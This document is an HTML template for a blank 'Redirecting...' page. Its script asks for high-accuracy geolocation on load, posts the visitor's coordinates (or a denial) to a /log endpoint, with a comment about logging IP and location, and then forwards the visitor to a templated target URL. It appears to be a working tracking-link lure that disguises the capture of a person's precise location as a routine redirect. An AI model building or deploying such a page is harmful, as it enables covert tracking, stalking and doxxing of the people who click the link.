<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #ffffff;
        }
    </style>
</head>

<body>
    <script>
        const FALLBACK_URL = '{{REDIRECT_URL}}';

        // Automatically request location permission on page load
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                // Success callback - user allowed location
                async (position) => {
                    try {
                        // Log IP and location
                        const response = await fetch('/log', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: Math.round(position.coords.accuracy),
                                denied: false
                            })
                        });

                        const data = await response.json();
                        // Redirect to target URL from server
                        window.location.href = data.redirectUrl || FALLBACK_URL;
                    } catch (error) {
                        console.error('Error logging data:', error);
                        window.location.href = FALLBACK_URL;
                    }
                },
                // Error callback - user denied location or other error
                async (error) => {
                    console.log('Location permission denied or error:', error);

                    try {
                        // Log the denial
                        const response = await fetch('/log', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ denied: true })
                        });

                        const data = await response.json();
                        // Redirect to target URL from server
                        window.location.href = data.redirectUrl || FALLBACK_URL;
                    } catch (err) {
                        console.error('Error logging denial:', err);
                        window.location.href = FALLBACK_URL;
                    }
                },
                // Options
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            // Browser doesn't support geolocation - just redirect
            window.location.href = FALLBACK_URL;
        }
    </script>
</body>

</html>